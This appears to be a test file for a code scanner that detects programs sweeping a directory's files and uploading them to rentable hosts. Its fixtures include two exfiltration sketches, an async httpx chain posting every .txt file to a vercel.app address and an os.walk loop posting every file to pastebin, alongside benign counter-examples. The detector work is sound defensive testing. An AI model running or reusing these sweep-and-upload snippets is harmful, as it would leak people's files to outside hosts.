"""Files swept from a directory and sent to a host anyone can rent (`flows/implants/swept_hosting.py`).

Every host is under `.invalid` or assembled here from pieces, and every source is only parsed."""

from __future__ import annotations

from cordon_scanner.analysis.python.pyast import PythonAnalyzer

HOST = "https://render" + "kit1.vercel.app"


class Kit:
    @staticmethod
    def swept(source: str) -> list[str]:
        return [
            h.detail
            for h in PythonAnalyzer.analyse(source)
            if h.detail == "sweep sent to a rentable host"
        ]


class TestASweepSentToAFreeHost:
    def test_the_async_chain(self) -> None:
        source = (
            "import asyncio, os\n"
            "from pathlib import Path\n"
            "import httpx\n"
            f"def default_api_base():\n    return os.environ.get('API_BASE', '{HOST}')\n"
            "def find_txt_log_files(root):\n"
            "    return [p for p in Path(root).rglob('*.txt')]\n"
            "async def post_text(client, name, text):\n"
            "    await client.post(default_api_base() + '/upload', json={'name': name, 'text': text})\n"
            "async def upload_file(client, path):\n"
            "    text = path.read_text()\n"
            "    await post_text(client, path.name, text)\n"
            "async def upload_all(root):\n"
            "    files = await asyncio.to_thread(find_txt_log_files, root)\n"
            "    async with httpx.AsyncClient() as client:\n"
            "        for f in files:\n"
            "            await upload_file(client, f)\n"
        )
        assert Kit.swept(source) == ["sweep sent to a rentable host"]

    def test_requests_post_in_a_loop_to_a_paste_host(self) -> None:
        source = (
            "import os, requests\n"
            "def sweep(root):\n"
            "    for dirpath, _, names in os.walk(root):\n"
            "        for n in names:\n"
            "            data = open(os.path.join(dirpath, n)).read()\n"
            f"            requests.post('https://{'pas' + 'tebin.com'}/api', data=data)\n"
        )
        assert Kit.swept(source) == ["sweep sent to a rentable host"]


class TestOrdinaryTools:
    def test_a_docs_builder_that_deploys_through_the_platform_cli(self) -> None:
        source = (
            "import os, subprocess\n"
            f"SITE = '{HOST}'\n"
            "def build(root):\n"
            "    for dirpath, _, names in os.walk(root):\n"
            "        print(len(names))\n"
            "    subprocess.run(['vercel', 'deploy', root])\n"
        )
        assert Kit.swept(source) == []

    def test_a_crash_reporter_that_sends_the_one_file_the_user_picked(self) -> None:
        source = (
            "import httpx\n"
            f"URL = '{HOST}/report'\n"
            "def report(path):\n"
            "    httpx.post(URL, content=open(path).read())\n"
        )
        assert Kit.swept(source) == []

    def test_a_sweep_sent_to_the_tools_own_api(self) -> None:
        source = (
            "import os, requests\n"
            "def sync(root):\n"
            "    for dirpath, _, names in os.walk(root):\n"
            "        for n in names:\n"
            "            requests.post('https://api.example.invalid/files', data=open(os.path.join(dirpath, n)).read())\n"
        )
        assert Kit.swept(source) == []
